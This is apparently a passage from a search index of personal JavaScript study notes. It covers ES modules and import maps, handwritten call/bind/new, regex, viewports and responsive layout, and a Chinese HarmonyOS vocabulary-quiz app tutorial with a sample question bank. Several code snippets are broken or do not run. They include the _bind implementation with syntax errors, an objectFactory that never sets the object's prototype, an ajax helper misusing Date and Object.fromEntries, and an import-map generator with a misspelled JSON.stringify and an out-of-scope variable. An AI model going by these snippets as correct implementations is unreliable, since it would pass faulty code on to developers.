statements;","text":"<p>sideEffect export: prototype polyfill</p>"},{"location":"JS/module/#static-module-structure","title":"static module structure","text":"<p>conditionally loaded modules</p>"},{"location":"JS/module/#module-format","title":"module format","text":"<p>modules:<code>\"amd\" | \"umd\" | \"systemjs\" | \"commonjs\" | \"cjs\"</code></p> <p>Load modules synchronously, while the body is executed - commonjs Load all modules asynchronously, before the body is executed - amd The synchronous syntax of Node.js plus the asynchronous loading of AMD -esm</p>"},{"location":"JS/module/#module-loading-steppath","title":"module loading: step,path","text":"<p>from entry point file to full depends graph construction</p> <ol> <li>find and fetch    module resolution: where to download the file containing the module    entry point <code>&lt;script src=\"main.js\" type=\"module\"/&gt;    module specifier</code> import loadh from \"lodash\"`    importmap    fetch:    module cache    the module file will only be fetched once even if multiple modules depend on it.    module map    using module cache to manage cache        What happens if another module depends on the same file? The loader will look up each URL in the module map. If it sees fetching in there, it will just move on to the next URL.</li> <li>parse    module record    prase the file into module record        once the module recode is created, it's placed into module map    </li> </ol> <p>If the main thread were to wait for each of these files to download, a lot of other tasks would pile up in its queue. That\u2019s because when you\u2019re working in a browser, the downloading part takes a long time.</p> <p>IN CommonJS can do things differently because loading files from the filesystem takes much less time than downloading across the Internet  </p>"},{"location":"JS/module/#export-after-declaration","title":"export after declaration","text":"<p>inline vs clause</p> <pre><code>//------ lib.js ------\n\nfunction times(a, b) {\n  return a * b\n}\nfunction sq(x) {\n  return times(x, x)\n}\n\nconst PI = 3.1415926\n\nexport { sq as square, PI }\n\n//------ main.js ------\n</code></pre>"},{"location":"JS/module/#default-export","title":"default export","text":"<pre><code>//------ helper.js ------\n\nfunction\n\nexport {\n  as _\n}\n</code></pre>"},{"location":"JS/module/#module-specifier-resolution","title":"module specifier resolution","text":"<p>control the resolution of module specifier</p> <pre><code>&lt;script type=\"importmap\"&gt;\n  {\n    \"imports\":{\n      \"lodash\": \"/node_modules/lodash-es/lodash.js\"//bare specifier\n      \"moment/\": \"/node_modules/moment/src/\" //trailing slashes\n      {/* in the Node.js ecosystem to import files without including the extension. trying multiple file extensions until we find a good match.*/}\n      \"lodash/fp\":\"/node_modules/lodash-es/fp.js\"//Extension-less imports with import map\n    \"https://www.unpkg.com/vue/dist/vue.runtime.esm.js\": \"/node_modules/vue/dist/vue.runtime.esm.js\" //url like specifier remapping\n    \"https://www.unpkg.com/vue/\": \"/node_modules/vue/\" //prefix-like mapping\n\n    }\n  }\n&lt;/script&gt;\n\nimport _ from 'lodash'\n{/* the above would act as if*/}\nimport _ from  \"/node_modules/lodash-es/lodash.js\"\n</code></pre>"},{"location":"JS/module/#browser-import-map-feature-support-detection","title":"browser import map feature support detection","text":"<p>feature support detection <pre><code>if(HTMLScriptElement?.supports('importmap'){\n\n}\n</code></pre></p>"},{"location":"JS/module/#mapping-away-hashes-in-script-filenames","title":"Mapping away hashes in script filenames","text":"<p>and with import statements that are of the form import \"./sub-dep.mjs\" instead of import \"./sub-dep-7be2aa47f.mjs\". Now, if we change sub-dep.mjs, we simply update our import map:</p> <pre><code>{\n  \"imports\": {\n    \"/js/app.mjs\": \"/js/app-8e0d62a03.mjs\",\n    \"/js/dep.mjs\": \"/js/dep-16f9d819a.mjs\",\n    \"/js/sub-dep.mjs\": \"/js/sub-dep-5f47101dc.mjs\"\n  }\n}\n</code></pre>"},{"location":"JS/module/#dynamic-generate-import-map","title":"dynamic generate import map","text":"<pre><code>if (HTMLScriptElement?.supports('importmap')) {\n  const im = document.createElement('script')\n  im.type = 'importmap'\n  im.textContent = JSON.stringfy({\n    import: {\n      lodash: '/node_modules/lodash-es/lodash.js',\n    },\n  })\n}\ndocument.currentScript.after(im)\n</code></pre> <p>// const script = document.currentScript // scirpt.dateset.theme // script.attributes.getNamedItem('src')</p> <p>Resouce Link import map proposal es module deep dive</p> <pre><code>\n</code></pre> <p>Interaction with speculative parsing/fetching</p> <p>Most browsers have a speculative HTML parser which tries to discover resources declared in HTML markup while the HTML parser is waiting for blocking scripts to be fetched and executed.</p>"},{"location":"JS/module/#importmeat","title":"import.meat","text":"<ol> <li> <p>JavaScript Module \u21a9</p> </li> <li> <p>@exploringjs &gt; modules  \u21a9</p> </li> </ol>"},{"location":"JS/prototype/","title":"\u539f\u578b\u7ee7\u627f","text":"<ul> <li> \u539f\u578b:\u4efb\u4f55js\u5bf9\u8c61\u7684\u521b\u5efa\u90fd\u4f1a\u5173\u8054\u4e00\u4e2a\u5bf9\u8c61, \u4efb\u4f55\u6839\u636e\u539f\u578b\u7684\u6784\u9020\u51fd\u6570\u521b\u5efa\u51fa\u6765\u7684\u5bf9\u8c61,\u90fd\u4f1a\u7ee7\u627f\u539f\u578b\u4e0a\u7684\u5c5e\u6027</li> </ul> <pre><code>function (){\n      this = Object.create(prototype)\n}\n\nconst o = new Object()\nconsole.log(o.__proto__ === Object.prototype)\nconsole.log(Object.getPrototypeOf(o) === Object.prototype)\nconsole.log(Object.prototype.constructor === Object)\n</code></pre> <ul> <li> \u539f\u578b\u94fe\u548c\u539f\u578b\u7ee7\u627f</li> </ul> <p>behaviour delegation vs prototype inheritance</p> <pre><code>console.log(o.constructor === Object)\nconsole.log(Object.prototype.constructor === Object) \n</code></pre>"},{"location":"JS/prototype/#callapply","title":"\u624b\u5199call\u548capply","text":"<pre><code>Function.prototype._call = function(context, ...args){\n  const symbol = Symbol()\n  // set context obj to window if null\n  context = Object(context|| window)\n  context[symbol] = this\n  // call the function with contxt obj\n  // if it has return value, recevie and return\n  const result = context[symbol](...args) \n  delete context[symbol];// delete the unique key\n  return result\n}\n</code></pre>"},{"location":"JS/prototype/#bind","title":"\u624b\u5199bind","text":"<pre><code>Function.prototype._bind = function(context){\n  if(typeof this !== 'function'){\n        throw Error('this is not a function')\n  }\n  // this is the `bind` was called on\n    var _this = this \n    var args = Array.prototype.slice.call(arguments, 1)\n\n  var fNOP = function {}\n\n    var fbound =  function(){\n            return _this.apply(\n        // ignores the \"explictly bound this\" parameter when it's called as a constructor\n        this instanceof fNOP ? this : context, \n        args.concat(Array.prototype.slice(arguments.1))\n      )\n        // \u907f\u514dfboud \u4fee\u6539\u539f\u578b\u7684\u65f6\u5019\u628athis\u7684\u539f\u578b\u4e5f\u4fee\u6539\u4e86\n        fNOP.prototype = this.prototype\n            fbound.prototype = new fNOP()\n        return fbound\n  }\n}\n</code></pre>"},{"location":"JS/prototype/#new","title":"\u624b\u5199new","text":"<pre><code>function objectFactory(){\n  const o = new Object(null)\n    var Constructor = [].shift.call(arguments)\n  o.prototype = Constructor.prototype\n    var ret = Constructor.apply(o,arguments)\n  return typeof ret === 'object' ? ret : o\n}\n</code></pre>"},{"location":"JS/regex/","title":"pattern and match","text":""},{"location":"JS/regex/#glob","title":"glob\u6587\u4ef6\u5339\u914d","text":"<p><code>*</code></p> <p><code>**</code></p>"},{"location":"JS/regex/#catch-group","title":"catch group","text":""},{"location":"JS/regex/#a-sequence-of-characters-or-string","title":"A Sequence of Characters (or String)","text":""},{"location":"JS/regex/#or-operator","title":"OR Operator (|)","text":""},{"location":"JS/regex/#occurrence-indicators-or-repetition-operators","title":"Occurrence Indicators (or Repetition Operators):","text":"<ul> <li>+: one or more (1+), e.g., [0-9]+ matches one or more digits such as '123', '000'.</li> <li>*: zero or more (0+), e.g., [0-9]* matches zero or more digits. It accepts all those in [0-9]+ plus the empty string.</li> <li>?: zero or one (optional), e.g., [+-]? matches an optional \"+\", \"-\", or an empty string.</li> <li>{m,n}: m to n (both inclusive)</li> <li>{m}: exactly m times</li> <li>{m,}: m or more (m+)</li> </ul>"},{"location":"JS/regex/#position-anchors-does-not-match-character-but-position-such-as-start-of-line-end-of-line-start-of-word-and-end-of-word","title":"Position Anchors: does not match character, but position such as start-of-line, end-of-line, start-of-word and end-of-word.","text":"<pre><code>^, $: start-of-line and end-of-line respectively. E.g., ^[0-9]$ matches a numeric string.\n\\b: boundary of word, i.e., start-of-word or end-of-word. E.g., \\bcat\\b matches the word \"cat\" in the input string.\n\\B: Inverse of \\b, i.e., non-start-of-word or non-end-of-word.\n\\&lt;, \\&gt;: start-of-word and end-of-word respectively, similar to \\b. E.g., \\&lt;cat\\&gt; matches the word \"cat\" in the input string.\n\\A, \\Z: start-of-input and end-of-input respectively.\n</code></pre>"},{"location":"JS/regex/#shorthand-character-class","title":"shorthand character class","text":"<p>\\d is short for [0-9]. \\d includes all digits</p> <p>\\w stands for \u201cword character\u201d. It always matches the ASCII characters [A-Za-z0-9_]. Notice the inclusion of the underscore and digits.</p> <p>\\s stands for \u201cwhitespace character\u201d.  it includes [ \\t\\r\\n\\f]. That is: \\s matches a space, a tab, a carriage return, a line feed, or a form feed</p>"},{"location":"JS/regex/#negated-shorthand-character-classes","title":"Negated  shorthand Character Classes","text":"<p>\\D is the same as [^\\d]  \\W is short for [^\\w] and \\S is the equivalent of [^\\s].</p> <ol> <li> <p>regex \u21a9</p> </li> <li> <p>[regex](https://www3.ntu.edu.sg/home/ehchua/programming/howto/Regexe.html#:~:text=A%20Regular%20Expression%20(or%20Regex,characters%2C%20metacharacters%20(such%20as%20.)\u00a0\u21a9</p> </li> </ol>"},{"location":"JS/render/","title":"\u6d4f\u89c8\u5668\u6e32\u67d3\u539f\u7406","text":""},{"location":"JS/request/","title":"\u624b\u5199\u8bf7\u6c42","text":"<ul> <li> ajax</li> <li> fetch</li> <li> axios</li> </ul> <pre><code>const ajax = (option) =&gt; {\n  const objToString = (data) =&gt; {\n    data.t = new Date.getTime()\n    const res = []\n    Object.fromEntries(data).forEach(([key, value]) =&gt; {\n      res.push(encodeURIComponent(key) + '=' + encodeURIComponent(value))\n    })\n    return res.join('&amp;')\n  }\n\n  objToString(option.data || {})\n}\n</code></pre>"},{"location":"JS/responsive/","title":"css workflow","text":"<ul> <li> spacing</li> <li> sizing</li> <li> alignment</li> <li> color</li> </ul>"},{"location":"JS/responsive/#white-space-bahaviour","title":"white-space bahaviour","text":"<p>css white space property</p> line breaks char extra while space Text wrapping <code>normal</code> Collapse Collapse Wrap <code>pre</code> Preserve Preserve No wrap <code>nowrap</code> Collapse Collapse No wrap <code>pre-wrap</code> Preserve Preserve Wrap <code>pre-line</code> Preserve Collapse Wrap"},{"location":"JS/responsive/#spacing","title":"spacingresize content to the viewporta tale of  two viewport","text":"<pre><code>  item:not(:last-child) {\n    margin-right: .06rem;\n  }\n</code></pre> viewports <p>user are used to scroll website vertically on both desktop and mobile deviecs - but not horizontally!</p> <p>so, if the user is forced to scroll horizontally, or zoom out, to see the whole web page, which results in a poor user experience</p> <p>The layout viewport is the viewport into which the browser draws a web page.</p> <p>visual viewport represents what is currently visible on the user's display device.</p> <p>pinching(\u634f\u5408) gesture can usually be used to zoom in and out on a site's contents</p> <p>Imagine the layout viewport as being a large image which does not change size or shape. Now image you have a smaller frame through which you look at the large image. The small frame is surrounded by opaque material which obscures your view of all but a portion of the large image. The portion of the large image that you can see through the frame is the visual viewport. You can back away from the large image while holding your frame (zoom out) to see the entire image at once, or you can move closer (zoom in) to see only a portion. You can also change the orientation of the frame, but the size and shape of the large image (layout viewport) never changes.</p> <p>George Cummins explains the basic concept best here at Stack Overflow:</p>"},{"location":"JS/responsive/#viewport-window-screen","title":"viewport , window, screen","text":"<p>To get the size of viewport</p> <pre><code>const size = {\n  width: window.innerWidth,\n  height: window.innerHeight\n}\n</code></pre>"},{"location":"JS/responsive/#device-pixels-vs-css-pixels","title":"device pixels vs css pixels","text":"<p><code>pixel</code> : represented by a square on computer monitor screen</p> <p><code>device pixels</code> : could be read from <code>screen.width</code> and <code>screent.height</code></p> <p><code>pixel ratio</code> <code>device pixels for one pixel unit on the software part</code></p> <pre><code>window.devicePixelRatio //2\n</code></pre>"},{"location":"JS/responsive/#resize","title":"resize","text":"<pre><code>document.documentElement.style.fontSize = document.documentElement.clientWidth / 375 * 100 + 'px'\nwindow.addEventListener('resize',() =&gt; {\n  document.documentElement.style.fontSize = document.documentElement.clientWidth / 375 * 100 + 'px'\n})\n</code></pre>"},{"location":"JS/responsive/#full-screen","title":"Full screen","text":"<p>fit the whole scrren to get immersive experience</p> <ul> <li><code>Fullscreen API</code></li> <li><code>Element.requestFullscreen()</code></li> <li><code>Document.exitFullscreen()</code></li> <li><code>Document.fullscreenElement</code></li> <li><code>:fullscreen</code>, <code>::backdrop</code></li> <li><code>allowfullscreen</code></li> </ul> <pre><code>window.addEventListener('dblclick', () =&gt; {\n  const fullscreenEl =\n    document.fullscreenElement || document.webkitFullscreenElement\n\n  if (!fullscreenEl) {\n    canvas.requestFullscreen &amp;&amp; canvas.requestFullscreen()\n    canvas.webkitRequestFullscreen &amp;&amp; canvas.webkitRequestFullscreen()\n  } else {\n    document.exitFullscreen &amp;&amp; document.exitFullscreen()\n    document.webkitExitFullscreen &amp;&amp; document.webkitExitFullscreen()\n  }\n})\n</code></pre> <pre><code>.el:fullscreen {\n  background-color: 'teal'\n}\n</code></pre> <p><code>zoom level</code> : at zoom level 1, one css pixel is exacty equal to one device pixel</p> <p>Screen Size</p> <p>measured in device pixel. they are  a feature of the monitor, and not of the browser</p> <p></p> <p>Window size</p>"},{"location":"JS/responsive/#scrolling-offset","title":"scrolling offsetall about height","text":"<p>find out how much the user has scrolled, <code>vertically, window.pageYOffset</code> or <code>horziontally, window.pageXOffset</code></p> <p>Suppose you have a liquid layout and one of your sidebars has <code>width: 10%</code>. Now the sidebar neatly grows and shrinks as you resize the browser window. But exactly how does that work?</p> <p>Technically, what happens is that the sidebar gets 10% of the width of its parent. Let\u2019s say that\u2019s the <code>&lt;body&gt;</code> (and that you haven\u2019t given it a <code>width</code>). So the question becomes which width the <code>&lt;body&gt;</code> has.</p> <p>Normally, all block-level elements take 100% of the width of their parent (there are exceptions, but let\u2019s ignore them for now). So the <code>&lt;body&gt;</code> is as wide as its parent, the <code>&lt;html&gt;</code> element, which is the uppermost containing block of your site.</p> <p>And how wide is the <code>&lt;html&gt;</code> element? Why, it\u2019s as wide as the browser window. That\u2019s why your sidebar with <code>width: 10%</code> will span 10% of the entire browser window. All web developers intuitively know and use this fact.</p> <p></p> <ul> <li> <p>offsetHeight    <code>VISIBLE content &amp; padding &amp; scrollbar</code></p> </li> <li> <p>clientHeight:   <code>VISIBLE content &amp; padding</code> only</p> </li> <li> <p>scollHeihgt   <code>ENTIRE content &amp; padding (visible or not)</code></p> </li> <li> <p>Element.getBoundingClientRect()</p> </li> </ul>"},{"location":"JS/responsive/#_1","title":"\u54cd\u5e94\u5f0f","text":""},{"location":"JS/test/","title":"Test","text":""},{"location":"JS/test/#1","title":"1. \u9879\u76ee\u7b80\u4ecb","text":"<p>\u8be5App\u7684\u6838\u5fc3\u529f\u80fd\u662f\u8f85\u52a9\u5355\u8bcd\u8bb0\u5fc6\uff0c\u4e3b\u8981\u5206\u4e3a\u4e09\u4e2a\u529f\u80fd\u6a21\u5757\uff0c\u5982\u4e0b\u56fe\u6240\u793a</p> \u6a21\u5757 \u7b54\u9898\u6a21\u5757 \u6253\u5361\u5708 \u4e2a\u4eba\u4e2d\u5fc3 \u56fe\u793a \u529f\u80fd \u7b54\u9898\u3001\u7edf\u8ba1\u3001\u6253\u5361 \u6253\u5361\u5217\u8868\u3001\u70b9\u8d5e \u767b\u5f55\u3001\u9000\u51fa\u767b\u5f55\u3001\u4e2a\u4eba\u6253\u5361\u8bb0\u5f55 <p>\u4e0b\u9762\u9010\u4e00\u5b8c\u6210\u6bcf\u4e2a\u6a21\u5757</p>"},{"location":"JS/test/#2","title":"2. \u7b54\u9898\u9875\u9762","text":""},{"location":"JS/test/#21","title":"2.1. \u529f\u80fd\u7b80\u4ecb","text":"<p>\u7b54\u9898\u9875\u9762\u5171\u6709\u4e09\u4e2a\u7ec3\u4e60\u72b6\u6001\uff0c\u5206\u522b\u662f\u7b54\u9898\u72b6\u6001\u3001\u6682\u505c\u72b6\u6001\u548c\u505c\u6b62\u72b6\u6001\u3002\u521d\u59cb\u72b6\u6001\u4e3a\u505c\u6b62\u72b6\u6001\uff0c\u505c\u6b62\u72b6\u6001\u4e0b\u4e0d\u53ef\u7b54\u9898\uff0c\u6b64\u65f6\u70b9\u51fb\u7b54\u6848\u9009\u9879\uff0c\u9700\u8981\u7ed9\u51fa\u63d0\u793a\uff0c\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u5728\u505c\u6b62\u72b6\u6001\u4e0b\uff0c\u53ef\u4ee5\u4fee\u6539\u6d4b\u8bd5\u7684\u5355\u8bcd\u4e2a\u6570\uff08\u5176\u4f59\u72b6\u6001\u4e0b\u5747\u4e0d\u53ef\u4fee\u6539\uff09\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002\u4e2a\u6570\u4fee\u6539\u540e\uff0c\u9700\u8981\u4ece\u9898\u5e93\u4e2d\u91cd\u65b0\u62bd\u53d6\u76f8\u5e94\u4e2a\u6570\u7684\u9898\u76ee\u3002</p> <p></p> <p>\u70b9\u51fb\u5f00\u59cb\u6d4b\u8bd5\u6309\u94ae\u5373\u53ef\u8fdb\u5165\u7b54\u9898\u72b6\u6001\uff0c\u6b64\u65f6\uff0c\u8ba1\u65f6\u5668\u5f00\u59cb\u8ba1\u65f6\uff0c</p> <p></p> <p>\u7b54\u9898\u64cd\u4f5c\u7684\u903b\u8f91\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u7b54\u9898\u8fc7\u7a0b\u4e2d\u9700\u8981\u5b9e\u65f6\u66f4\u65b0\u7edf\u8ba1\u4fe1\u606f\uff0c\u7edf\u8ba1\u6307\u6807\u5305\u62ec\u8fdb\u5ea6\u548c\u51c6\u786e\u7387\uff0c\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u7b54\u9898\u8fc7\u7a0b\u4e2d\u70b9\u51fb\u6682\u505c\u6d4b\u8bd5\u6309\u94ae\u53ef\u8fdb\u5165\u6682\u505c\u72b6\u6001\uff0c\u6682\u505c\u72b6\u6001\u4e0b\uff0c\u8ba1\u65f6\u5668\u505c\u6b62\u8ba1\u65f6\u3002</p> <p>\u518d\u6b21\u70b9\u51fb\u5f00\u59cb\u6d4b\u8bd5\uff0c\u91cd\u65b0\u8fdb\u5165\u7b54\u9898\u72b6\u6001\uff0c\u8ba1\u65f6\u5668\u6062\u590d\u8ba1\u65f6\u3002</p> <p>\u5f53\u672c\u8f6e\u6d4b\u8bd5\u9898\u76ee\u5168\u90e8\u5b8c\u6210\u6216\u8005\u63d0\u524d\u70b9\u51fb\u7ed3\u675f\u6d4b\u8bd5\u6309\u94ae\uff0c\u8fdb\u5165\u505c\u6b62\u72b6\u6001\uff0c\u5e76\u5f39\u7a97\u663e\u793a\u7edf\u8ba1\u7ed3\u679c\uff0c\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u6b64\u65f6\uff0c</p> <p>\u70b9\u51fb\u53f3\u4e0a\u89d2\u5173\u95ed\u6309\u94ae\uff0c\u5f39\u7a97\u5173\u95ed\uff0c\u540c\u65f6\u6d4b\u8bd5\u9898\u76ee\u548c\u7edf\u8ba1\u4fe1\u606f\u91cd\u7f6e\uff0c\u7b54\u9898\u9875\u9762\u56de\u5230\u521d\u59cb\u72b6\u6001\u3002</p> <p>\u70b9\u51fb\u518d\u6765\u4e00\u5c40\u6309\u94ae\uff0c\u5f39\u7a97\u5173\u95ed\uff0c\u540c\u65f6\u6d4b\u8bd5\u9898\u76ee\u548c\u7edf\u8ba1\u4fe1\u606f\u91cd\u7f6e\uff0c\u7136\u540e\u76f4\u63a5\u8fdb\u5165\u7b54\u9898\u72b6\u6001\u3002</p> <p>\u70b9\u51fb\u767b\u5f55\u6253\u5361\u6309\u94ae\uff0c\u5f39\u7a97\u5173\u95ed\uff0c\u540c\u65f6\u6d4b\u8bd5\u9898\u76ee\u548c\u7edf\u8ba1\u4fe1\u606f\u91cd\u7f6e\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5230\u767b\u5f55\u9875\u9762\u3002</p>"},{"location":"JS/test/#22","title":"2.2. \u5b9e\u73b0\u601d\u8def","text":""},{"location":"JS/test/#221","title":"2.2.1. \u6240\u9700\u6280\u80fd","text":"<p>\u7b54\u9898\u6a21\u5757\u6240\u9700\u6280\u80fd\u5982\u4e0b</p> <ol> <li>\u5e38\u7528\u5e03\u5c40\u7684\u4f7f\u7528\uff1aColumn\u3001Row\u7b49\u7b49</li> <li>\u5e38\u7528\u7ec4\u4ef6\u7684\u4f7f\u7528\uff1aProgress\u3001Button\u3001Image\u3001Text\u3001TextTimmer\uff08\u8ba1\u65f6\u5668\uff09\u7b49\u7b49</li> <li>\u81ea\u5b9a\u4e49\u7ec4\u4ef6</li> <li>\u81ea\u5b9a\u4e49\u5f39\u7a97</li> <li>\u7ec4\u4ef6\u72b6\u6001\u7ba1\u7406\uff1a@State\u3001@Prop\u3001@Link\u3001@Watch\u7b49\u7b49</li> </ol> <p>\u4e0a\u8ff0\u5185\u5bb9\u53ef\u53c2\u8003HarmonyOS 4.0 \u5e94\u7528\u5f00\u53d1\u4e2d\u7684\u7b2c3\u30014\u30015\u7ae0\u3002</p>"},{"location":"JS/test/#222","title":"2.2.2. \u5b9e\u73b0\u8fc7\u7a0b","text":""},{"location":"JS/test/#2221","title":"2.2.2.1. \u57fa\u7840\u5e03\u5c40\u548c\u6837\u5f0f","text":"<p>\u7b54\u9898\u9875\u9762\u7684\u57fa\u672c\u5e03\u5c40\u5982\u4e0b\u56fe\u6240\u793a</p> <p></p> <p>\u5404\u7ec4\u4ef6\u6837\u5f0f\u5982\u4e0b</p> \u7ec4\u4ef6 \u6837\u5f0f \u6548\u679c \u9875\u9762\u80cc\u666f <code>@Extend(Column) function practiceBgStyle() {  .width('100%')  .height('100%')  .backgroundImage($r('app.media.img_practice_bg'))  .backgroundImageSize({ width: '100%', height: '100%' })  .justifyContent(FlexAlign.SpaceEvenly) }</code> \u7edf\u8ba1\u9762\u677f\u80cc\u666f <code>@Styles function statBgStyle() {  .backgroundColor(Color.White)  .width('90%')  .borderRadius(10)  .padding(20) }</code> \u5355\u8bcd <code>@Extend(Text) function wordStyle() {  .fontSize(50)  .fontWeight(FontWeight.Bold) }</code> \u4f8b\u53e5 <code>@Extend(Text) function sentenceStyle() {  .height(40)  .fontSize(16)  .fontColor('#9BA1A5')  .fontWeight(FontWeight.Medium)  .width('80%')  .textAlign(TextAlign.Center) }</code> \u9009\u9879\u6309\u94ae <code>@Extend(Button) function optionButtonStyle(color: {  bg: ResourceColor,  font: ResourceColor }) {  .width(240)  .height(48)  .fontSize(16)  .type(ButtonType.Normal)  .fontWeight(FontWeight.Medium)  .borderRadius(8)  .backgroundColor(color.bg)  .fontColor(color.font) }</code> \u63a7\u5236\u6309\u94ae <code>@Extend(Button) function controlButtonStyle(color: {  bg: ResourceColor,  border: ResourceColor,  font: ResourceColor }) {  .fontSize(16)  .borderWidth(1)  .backgroundColor(color.bg)  .borderColor(color.border)  .fontColor(color.font) }</code>"},{"location":"JS/test/#2222","title":"2.2.2.2. \u7ec3\u4e60\u72b6\u6001","text":"<p>\u7ec3\u4e60\u72b6\u6001\u5171\u6709\u4e09\u4e2a\u5206\u522b\u662f\u7b54\u9898\u72b6\u6001\u3001\u6682\u505c\u72b6\u6001\u548c\u505c\u6b62\u72b6\u6001\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u679a\u4e3e\u7c7b\u578b\u6765\u8868\u793a\u4e09\u4e2a\u72b6\u6001\uff0c\u5982\u4e0b</p> <pre><code>export enum PracticeStatus {\n  Running, //\u7b54\u9898\u72b6\u6001\n  Paused, //\u6682\u505c\u72b6\u6001\n  Stopped //\u505c\u6b62\u72b6\u6001\n}\n</code></pre> <p>\u4e4b\u540e\u5b9a\u4e49\u4e00\u4e2a\u4e0a\u8ff0\u679a\u4e3e\u7c7b\u578b\u7684\u72b6\u6001\u53d8\u91cf\u8868\u793a\u5f53\u524d\u6240\u5904\u7684\u7ec3\u4e60\u72b6\u6001\uff0c\u5982\u4e0b</p> <pre><code>@State practiceStatus: PracticeStatus = PracticeStatus.Stopped\n</code></pre> <p>\u7ec3\u4e60\u72b6\u6001\u7684\u63a7\u5236\u901a\u8fc7\u5e95\u90e8\u7684\u4e24\u4e2a\u63a7\u5236\u6309\u94ae\u5b9e\u73b0\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u4e24\u4e2a\u6309\u94ae\u5728\u4e0d\u540c\u7684\u72b6\u6001\u4e0b\u4e5f\u5e94\u5448\u73b0\u4e0d\u540c\u7684\u6837\u5f0f\uff0c\u5982\u4e0b\u56fe</p> \u7ec3\u4e60\u72b6\u6001 \u505c\u6b62\u72b6\u6001 \u7b54\u9898\u72b6\u6001 \u6682\u505c\u72b6\u6001 \u6548\u679c <p>\u5177\u4f53\u5185\u5bb9\u53ef\u53c2\u8003\u5982\u4e0b\u4ee3\u7801</p> <pre><code>Button('\u505c\u6b62\u6d4b\u8bd5')\n  .controlButtonStyle({\n    bg: Color.Transparent,\n    border: this.practiceStatus === PracticeStatus.Stopped ? Color.Gray : Color.Black,\n    font: this.practiceStatus === PracticeStatus.Stopped ? Color.Gray : Color.Black\n  })\n  .enabled(this.practiceStatus !== PracticeStatus.Stopped)\n\nButton(this.practiceStatus === PracticeStatus.Running ? '\u6682\u505c\u6d4b\u8bd5' : '\u5f00\u59cb\u6d4b\u8bd5')\n  .controlButtonStyle({\n    bg: this.practiceStatus === PracticeStatus.Running ? '#555555' : Color.Black,\n    border: this.practiceStatus === PracticeStatus.Running ? '#555555' : Color.Black,\n    font: Color.White\n  })\n  .stateEffect(false)\n</code></pre> <p>\u53e6\u5916\u8fd8\u9700\u4e3a\u4e24\u4e2a\u6309\u94ae\u7ed1\u5b9a\u70b9\u51fb\u4e8b\u4ef6\uff0c\u6765\u5904\u7406\u7ec3\u4e60\u72b6\u6001\u7684\u53d8\u5316\u3002</p>"},{"location":"JS/test/#2223","title":"2.2.2.3. \u5207\u9898\u903b\u8f91","text":"<p>\u5207\u9898\u6548\u679c\u901a\u8fc7\u4e24\u4e2a\u72b6\u6001\u53d8\u91cf\u5b9e\u73b0\uff0c\u4e00\u4e2a\u662f\u9898\u76ee\u6570\u7ec4\uff0c\u4e00\u4e2a\u662f\u6570\u7ec4\u7d22\u5f15\uff0c\u6570\u7ec4\u4fdd\u5b58\u7684\u662f\u672c\u8f6e\u6d4b\u8bd5\u7684\u5168\u90e8\u9898\u76ee\uff0c\u7d22\u5f15\u662f\u6307\u5f53\u524d\u9898\u76ee\u7684\u7d22\u5f15\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u53ea\u9700\u4fee\u6539currentIndex\uff0c\u5c31\u80fd\u5b9e\u73b0\u5207\u9898\u7684\u6548\u679c</p> <p></p> <p>\u9898\u76ee\u6570\u636e\u7684\u7c7b\u578b\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <pre><code>export interface Question {\n  word: string; //\u5355\u8bcd\n  sentence: string; //\u4f8b\u53e5\n  options: string[]; //\u9009\u9879\n  answer: string; //\u7b54\u6848\n}\n\n//\u9898\u5e93\nexport const questionData: Question[] = [\n  {\n    word: \"book\",\n    options: [\"\u4e66\u7c4d\", \"\u7b14\", \"\u6a61\u76ae\", \"\u80cc\u5305\"],\n    answer: \"\u4e66\u7c4d\",\n    sentence: \"I love to read a good book every night.\"\n  },\n  {\n    word: \"computer\",\n    options: [\"\u7535\u89c6\", \"\u7535\u8111\", \"\u624b\u673a\", \"\u76f8\u673a\"],\n    answer: \"\u7535\u8111\",\n    sentence: \"I use the computer for work and entertainment.\"\n  },\n  {\n    word: \"apple\",\n    options: [\"\u9999\u8549\", \"\u6843\u5b50\", \"\u68a8\", \"\u82f9\u679c\"],\n    answer: \"\u82f9\u679c\",\n    sentence: \"She enjoys eating a crisp apple in the afternoon.\"\n  },\n  {\n    word: \"sun\",\n    options: [\"\u6708\u4eae\", \"\u592a\u9633\", \"\u661f\u661f\", \"\u5730\u7403\"],\n    answer: \"\u592a\u9633\",\n    sentence: \"The sun provides warmth and light to our planet.\"\n  },\n  {\n    word: \"water\",\n    options: [\"\u706b\", \"\u571f\u5730\", \"\u98ce\", \"\u6c34\"],\n    answer: \"\u6c34\",\n    sentence: \"I always carry a bottle of water with me.\"\n  },\n  {\n    word: \"mountain\",\n    options: [\"\u6c99\u6f20\", \"\u6d77\u6d0b\", \"\u5e73\u539f\", \"\u5c71\"],\n    answer: \"\u5c71\",\n    sentence: \"The mountain range is covered in snow during winter.\"\n  },\n  {\n    word: \"flower\",\n    options: [\"\u6811\u6728\", \"\u8349\u5730\", \"\u82b1\", \"\u704c\u6728\"],\n    answer: \"\u82b1\",\n    sentence: \"The garden is filled with colorful flowers.\"\n  },\n  {\n    word: \"car\",\n    options: [\"\u81ea\u884c\u8f66\", \"\u98de\u673a\", \"\u8239\", \"\u6c7d\u8f66\"],\n    answer: \"\u6c7d\u8f66\",\n    sentence: \"I drive my car to work every day.\"\n  },\n  {\n    word: \"time\",\n    options: [\"\u7a7a\u95f4\", \"\u65f6\u949f\", \"\u65e5\u5386\", \"\u65f6\u95f4\"],\n    answer: \"\u65f6\u95f4\",\n    sentence: \"Time flies when you're having fun.\"\n  },\n  {\n    word: \"music\",\n    options: [\"\u753b\", \"\u821e\u8e48\", \"\u97f3\u4e50\", \"\u620f\u5267\"],\n    answer: \"\u97f3\u4e50\",\n    sentence: \"Listening to music helps me relax.\"\n  },\n  {\n    word: \"rain\",\n    options: [\"\u96ea\", \"\u96f7\u7535\", \"\u9633\u5149\", \"\u96e8\"],\n    answer: \"\u96e8\",\n    sentence: \"I enjoy the sound of rain tapping on the window.\"\n  },\n  {\n    word: \"fire\",\n    options: [\"\u51b0\", \"\u706b\u7130\", 